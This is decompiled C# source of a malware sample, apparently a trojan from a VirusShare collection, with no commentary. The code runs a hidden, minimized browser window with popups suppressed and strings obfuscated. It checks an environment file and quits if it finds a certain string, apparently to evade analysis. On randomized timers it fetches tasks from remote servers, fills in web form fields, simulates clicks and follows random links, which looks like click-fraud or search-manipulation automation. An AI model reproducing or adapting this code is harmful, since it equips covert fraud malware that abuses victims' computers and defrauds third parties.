// Decompiled with JetBrains decompiler
// Type: BrowserDene.Form1
// Assembly: BrowserDene, Version=1.2.0.5, Culture=neutral, PublicKeyToken=null
// MVID: DAE765B5-201F-4D65-9BED-4F0B91589302
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.kkre-c0842c75a24461d565189cb06a77634b0df750b03039b181eab7e804e0041c23.exe

using jnWuCL2R1ooLn9T0aL;
using Microsoft.Win32;
using pDl8exp2J4vFwspcJW;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace BrowserDene
{
  public class Form1 : Form
  {
    private const int q5kUlR6HH = -20;
    private const int \u0034eG9hUnVk = 128;
    public bool gezdimi;
    private string n2dwTw3Qk;
    private KeyValuePair<string, string> u88yKw6XC;
    private List<KeyValuePair<string, string>> \u00359hoMouBb = new List<KeyValuePair<string, string>>();
    private int \u0037roEWKZTH;
    private IContainer FBJv0Qg1h;
    private WebBrowser PTDCk2gNe;
    private System.Windows.Forms.Timer \u0037810516qo;

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr window, int index, int value);

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr window, int index);

    [DllImport("winmm.dll")]
    public static extern int sndPlaySound(string lpszSoundName, int uFlags);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Form1() => this.ZbtTbTJaT();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void MkbjasldQ()
    {
      if (!System.IO.File.ReadAllText(Environment.GetEnvironmentVariable(A4Qf9kACG8yRdmjHsO.sx57h5IVg(88)) + A4Qf9kACG8yRdmjHsO.sx57h5IVg(104)).Contains(A4Qf9kACG8yRdmjHsO.sx57h5IVg(162)))
        return;
      Environment.Exit(1);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void sx57h5IVg([In] string obj0, [In] string obj1, [In] string obj2)
    {
      if (!(this.PTDCk2gNe.Document != (HtmlDocument) null))
        return;
      foreach (HtmlElement htmlElement in this.PTDCk2gNe.Document.GetElementsByTagName(A4Qf9kACG8yRdmjHsO.sx57h5IVg(222)))
      {
        if (htmlElement.GetAttribute(obj0).Equals(obj1))
          htmlElement.SetAttribute(A4Qf9kACG8yRdmjHsO.sx57h5IVg(236), obj2);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void mJPF5Nxpp([In] string obj0, [In] string obj1)
    {
      if (A4Qf9kACG8yRdmjHsO.MkbjasldQ(0) || !(this.PTDCk2gNe.Document != (HtmlDocument) null))
        return;
      foreach (HtmlElement htmlElement in this.PTDCk2gNe.Document.GetElementsByTagName(A4Qf9kACG8yRdmjHsO.sx57h5IVg(250)))
      {
        if (htmlElement.GetAttribute(obj0).Equals(obj1))
        {
          htmlElement.RaiseEvent(A4Qf9kACG8yRdmjHsO.sx57h5IVg(264));
          htmlElement.RaiseEvent(A4Qf9kACG8yRdmjHsO.sx57h5IVg(290));
          htmlElement.InvokeMember(A4Qf9kACG8yRdmjHsO.sx57h5IVg(316));
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private bool FI16VScDD([In] string obj0)
    {
      bool flag = false;
      if (this.PTDCk2gNe.Document != (HtmlDocument) null)
      {
        HtmlElementCollection elementsByTagName = this.PTDCk2gNe.Document.GetElementById(A4Qf9kACG8yRdmjHsO.sx57h5IVg(330)).GetElementsByTagName(A4Qf9kACG8yRdmjHsO.sx57h5IVg(342));
        List<HtmlElement> htmlElementList = new List<HtmlElement>();
        foreach (HtmlElement htmlElement in elementsByTagName)
        {
          string attribute = htmlElement.GetAttribute(A4Qf9kACG8yRdmjHsO.sx57h5IVg(348));
          if (!attribute.Contains(A4Qf9kACG8yRdmjHsO.sx57h5IVg(360)) && !attribute.Contains(A4Qf9kACG8yRdmjHsO.sx57h5IVg(428)))
            htmlElementList.Add(htmlElement);
        }
        foreach (HtmlElement htmlElement in htmlElementList)
        {
          if (htmlElement.GetAttribute(A4Qf9kACG8yRdmjHsO.sx57h5IVg(462)).Contains(obj0))
          {
            htmlElement.RaiseEvent(A4Qf9kACG8yRdmjHsO.sx57h5IVg(474));
            htmlElement.RaiseEvent(A4Qf9kACG8yRdmjHsO.sx57h5IVg(500));
            htmlElement.InvokeMember(A4Qf9kACG8yRdmjHsO.sx57h5IVg(526));
            flag = true;
            break;
          }
        }
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
    {
      if (!A4Qf9kACG8yRdmjHsO.MkbjasldQ(4))
        return;
      string str = e.Url.ToString();
      Random random = new Random();
      if (str == A4Qf9kACG8yRdmjHsO.sx57h5IVg(540) && this.u88yKw6XC.Value != "" && this.n2dwTw3Qk != "")
      {
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer()
        {
          Interval = random.Next(1500, 3000)
        };
        timer.Tick += (EventHandler) ((obj0, obj1) =>
        {
          this.mJPF5Nxpp(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1422), A4Qf9kACG8yRdmjHsO.sx57h5IVg(1434));
          this.mJPF5Nxpp(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1446), A4Qf9kACG8yRdmjHsO.sx57h5IVg(1458));
          ((System.Windows.Forms.Timer) obj0).Stop();
          ((Component) obj0).Dispose();
        });
        this.sx57h5IVg(A4Qf9kACG8yRdmjHsO.sx57h5IVg(594), A4Qf9kACG8yRdmjHsO.sx57h5IVg(606), this.u88yKw6XC.Key);
        timer.Start();
      }
      else if (str.StartsWith(A4Qf9kACG8yRdmjHsO.sx57h5IVg(612)) && str.Contains(A4Qf9kACG8yRdmjHsO.sx57h5IVg(666)))
      {
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer()
        {
          Interval = random.Next(3000, 7000)
        };
        timer.Tick += (EventHandler) ((obj0, obj1) =>
        {
          if (!this.FI16VScDD(this.u88yKw6XC.Value))
            this.\u0036MhAXxfhv();
          ((System.Windows.Forms.Timer) obj0).Stop();
          ((Component) obj0).Dispose();
        });
        timer.Start();
      }
      else
      {
        if (!str.Contains(this.u88yKw6XC.Value) || str.StartsWith(A4Qf9kACG8yRdmjHsO.sx57h5IVg(680)))
          return;
        System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer()
        {
          Interval = random.Next(60000, 120000)
        };
        timer.Tick += (EventHandler) ((obj0, obj1) =>
        {
          if (!this.gezdimi)
          {
            this.iZk2MVh4G();
            this.gezdimi = true;
          }
          ((System.Windows.Forms.Timer) obj0).Stop();
          ((Component) obj0).Dispose();
        });
        timer.Start();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void iZk2MVh4G()
    {
      if (A4Qf9kACG8yRdmjHsO.MkbjasldQ(8) || !(this.PTDCk2gNe.Document != (HtmlDocument) null))
        return;
      HtmlElementCollection elementsByTagName = this.PTDCk2gNe.Document.GetElementsByTagName(A4Qf9kACG8yRdmjHsO.sx57h5IVg(726));
      List<HtmlElement> htmlElementList = new List<HtmlElement>(elementsByTagName.Count);
      foreach (HtmlElement htmlElement in elementsByTagName)
      {
        if (htmlElement.GetAttribute(A4Qf9kACG8yRdmjHsO.sx57h5IVg(732)) != A4Qf9kACG8yRdmjHsO.sx57h5IVg(748) && !string.IsNullOrEmpty(htmlElement.InnerText))
          htmlElementList.Add(htmlElement);
      }
      Random random = new Random();
      htmlElementList[random.Next(htmlElementList.Count - 1)].InvokeMember(A4Qf9kACG8yRdmjHsO.sx57h5IVg(764));
      htmlElementList.Clear();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0036MhAXxfhv()
    {
      switch (this.\u0037roEWKZTH)
      {
        case 6:
          this.CLRG1ooLn();
          break;
        case 7:
          this.noKXXjnWu();
          break;
        case 8:
          this.\u00300RYopuga();
          break;
        case 9:
          this.tePpmgDe2();
          break;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void tePpmgDe2()
    {
      if (!(this.PTDCk2gNe.Document != (HtmlDocument) null))
        return;
      this.PTDCk2gNe.Document.GetElementById(A4Qf9kACG8yRdmjHsO.sx57h5IVg(778)).InvokeMember(A4Qf9kACG8yRdmjHsO.sx57h5IVg(794));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u00300RYopuga() => this.CLRG1ooLn();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void noKXXjnWu() => this.CLRG1ooLn();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CLRG1ooLn()
    {
      if (!(this.PTDCk2gNe.Document != (HtmlDocument) null))
        return;
      foreach (HtmlElement htmlElement in this.PTDCk2gNe.Document.GetElementsByTagName(A4Qf9kACG8yRdmjHsO.sx57h5IVg(808)))
      {
        if (htmlElement.OuterHtml.Contains(A4Qf9kACG8yRdmjHsO.sx57h5IVg(814)))
          htmlElement.InvokeMember(A4Qf9kACG8yRdmjHsO.sx57h5IVg(846));
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0039T0KaLA4Q([In] object obj0, [In] EventArgs obj1)
    {
      Form1.MkbjasldQ();
      this.f9kkCG8yR();
      mgDe2060RopuganoKX.sx57h5IVg();
      Form1.SetWindowLong(this.Handle, -20, Form1.GetWindowLong(this.Handle, -20) | 128);
      this.\u0037810516qo.Interval = new Random().Next(400000, 1500000);
      this.FwsZpcJW7();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void f9kkCG8yR() => this.\u0037roEWKZTH = int.Parse(Registry.LocalMachine.OpenSubKey(A4Qf9kACG8yRdmjHsO.sx57h5IVg(860)).GetValue(A4Qf9kACG8yRdmjHsO.sx57h5IVg(936)).ToString().Substring(0, 1));

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string dmj8HsOpD([In] string obj0)
    {
      string str = "";
      WebHeaderCollection headerCollection1 = new WebHeaderCollection();
      headerCollection1.Add(A4Qf9kACG8yRdmjHsO.sx57h5IVg(954), A4Qf9kACG8yRdmjHsO.sx57h5IVg(978));
      WebHeaderCollection headerCollection2 = headerCollection1;
      using (WebClient webClient = new WebClient()
      {
        Encoding = Encoding.Default,
        Headers = headerCollection2
      })
      {
        try
        {
          string input = webClient.DownloadString(obj0);
          str = new Regex(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1082), RegexOptions.IgnoreCase | RegexOptions.Compiled).Match(input).Groups[1].ToString();
        }
        catch (Exception ex)
        {
        }
      }
      return str;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void l8eQx2J4v()
    {
      if (!A4Qf9kACG8yRdmjHsO.MkbjasldQ(12))
        return;
      WebHeaderCollection headerCollection1 = new WebHeaderCollection();
      headerCollection1.Add(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1100), A4Qf9kACG8yRdmjHsO.sx57h5IVg(1124));
      WebHeaderCollection headerCollection2 = headerCollection1;
      using (WebClient webClient = new WebClient()
      {
        Encoding = Encoding.Default,
        Headers = headerCollection2
      })
      {
        try
        {
          string[] strArray = webClient.DownloadString(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1228) + this.n2dwTw3Qk + A4Qf9kACG8yRdmjHsO.sx57h5IVg(1246)).Split('|');
          KeyValuePair<string, string> keyValuePair = new KeyValuePair<string, string>(strArray[0], strArray[1]);
          this.gezdimi = false;
          if (!this.\u00359hoMouBb.Contains(keyValuePair))
          {
            this.u88yKw6XC = keyValuePair;
            this.\u00359hoMouBb.Add(this.u88yKw6XC);
          }
          else
          {
            this.\u0037810516qo.Enabled = false;
            Thread.Sleep(300000);
            this.l8eQx2J4v();
            this.\u0037810516qo.Enabled = true;
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FwsZpcJW7()
    {
      this.n2dwTw3Qk = this.dmj8HsOpD(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1270));
      this.l8eQx2J4v();
      this.PTDCk2gNe.Navigate(A4Qf9kACG8yRdmjHsO.sx57h5IVg(1330));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0034QS3xoKFQ([In] object obj0, [In] EventArgs obj1) => this.FwsZpcJW7();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SNLuN7eob([In] object obj0, [In] CancelEventArgs obj1) => obj1.Cancel = true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.FBJv0Qg1h != null)
        this.FBJv0Qg1h.Dispose();
      base.Dispose(disposing);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ZbtTbTJaT()
    {
      if (A4Qf9kACG8yRdmjHsO.MkbjasldQ(16))
        return;
      this.FBJv0Qg1h = (IContainer) new Container();
      this.PTDCk2gNe = new WebBrowser();
      this.\u0037810516qo = new System.Windows.Forms.Timer(this.FBJv0Qg1h);
      this.SuspendLayout();
      this.PTDCk2gNe.Dock = DockStyle.Fill;
      this.PTDCk2gNe.Location = new Point(0, 0);
      this.PTDCk2gNe.MinimumSize = new Size(20, 20);
      this.PTDCk2gNe.Name = A4Qf9kACG8yRdmjHsO.sx57h5IVg(1382);
      this.PTDCk2gNe.ScriptErrorsSuppressed = true;
      this.PTDCk2gNe.Size = new Size(863, 351);
      this.PTDCk2gNe.TabIndex = 0;
      this.PTDCk2gNe.WebBrowserShortcutsEnabled = false;
      this.PTDCk2gNe.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted);
      this.PTDCk2gNe.NewWindow += new CancelEventHandler(this.SNLuN7eob);
      this.\u0037810516qo.Enabled = true;
      this.\u0037810516qo.Interval = 300000;
      this.\u0037810516qo.Tick += new EventHandler(this.\u0034QS3xoKFQ);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(863, 351);
      this.Controls.Add((Control) this.PTDCk2gNe);
      this.Name = A4Qf9kACG8yRdmjHsO.sx57h5IVg(1408);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.\u0039T0KaLA4Q);
      this.ResumeLayout(false);
    }
  }
}
